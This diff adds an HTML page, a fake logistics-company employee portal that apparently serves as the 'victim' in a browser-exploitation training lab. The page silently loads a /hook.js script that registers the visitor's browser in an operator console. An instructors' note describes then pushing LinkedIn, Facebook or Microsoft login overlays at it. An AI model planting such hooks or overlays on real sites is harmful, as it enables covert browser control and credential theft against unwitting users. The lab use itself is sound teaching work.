@@ -1,0 +1,61 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Northwind Logistics — Employee Portal</title>
+<style>
+  :root{--blue:#1f4e79;--ink:#1c2430;--muted:#5b6573;--line:#e6e9ee}
+  *{box-sizing:border-box}
+  body{margin:0;font:16px/1.6 system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;color:var(--ink);background:#f5f7fa}
+  header{background:var(--blue);color:#fff;padding:14px 28px;display:flex;align-items:center;gap:12px}
+  header .logo{width:30px;height:30px;border-radius:6px;background:#fff;color:var(--blue);
+    display:grid;place-items:center;font-weight:800}
+  header nav{margin-left:auto;display:flex;gap:22px;font-size:14px}
+  header nav a{color:#dbe6f3;text-decoration:none}
+  .hero{max-width:980px;margin:36px auto;padding:0 24px}
+  .hero h1{font-size:30px;margin:0 0 8px}
+  .hero p{color:var(--muted);max-width:60ch}
+  .grid{max-width:980px;margin:24px auto;padding:0 24px;display:grid;
+    grid-template-columns:repeat(3,1fr);gap:18px}
+  .card{background:#fff;border:1px solid var(--line);border-radius:12px;padding:20px}
+  .card h3{margin:0 0 6px;font-size:17px}
+  .card p{margin:0;color:var(--muted);font-size:14px}
+  .lab{max-width:980px;margin:24px auto 60px;padding:14px 18px;border-radius:10px;
+    background:#fff7e6;border:1px solid #ffd99a;color:#7a5300;font-size:13px}
+  footer{border-top:1px solid var(--line);color:var(--muted);font-size:13px;
+    text-align:center;padding:22px}
+</style>
+</head>
+<body>
+  <header>
+    <div class="logo">N</div>
+    <strong>Northwind Logistics</strong>
+    <nav><a href="#">Dashboard</a><a href="#">Shipments</a><a href="#">Payroll</a><a href="#">Help</a></nav>
+  </header>
+
+  <section class="hero">
+    <h1>Welcome back to the Employee Portal</h1>
+    <p>Track shipments, review your timesheet, and manage benefits — all in one place.
+       This is an ordinary intranet page. Nothing here looks unusual to a user.</p>
+  </section>
+
+  <section class="grid">
+    <div class="card"><h3>This Week</h3><p>3 shipments in transit, 1 awaiting pickup.</p></div>
+    <div class="card"><h3>Timesheet</h3><p>32.5 hours logged. Submit by Friday 5pm.</p></div>
+    <div class="card"><h3>Announcements</h3><p>Open enrollment closes June 30. Review your plan.</p></div>
+  </section>
+
+  <div class="lab">
+    <strong>Lab note (instructors):</strong> this page is the "victim." It loads
+    <code>/hook.js</code> below, so the moment you open it the browser appears in the
+    operator console. Then deploy a LinkedIn / Facebook / Microsoft overlay at it.
+    Remove this banner for a cleaner live demo.
+  </div>
+
+  <footer>© Northwind Logistics — internal use only.</footer>
+
+  <!-- The hook. In a real engagement this arrives via XSS or a malicious page. -->
+  <script src="/hook.js"></script>
+</body>
+</html>
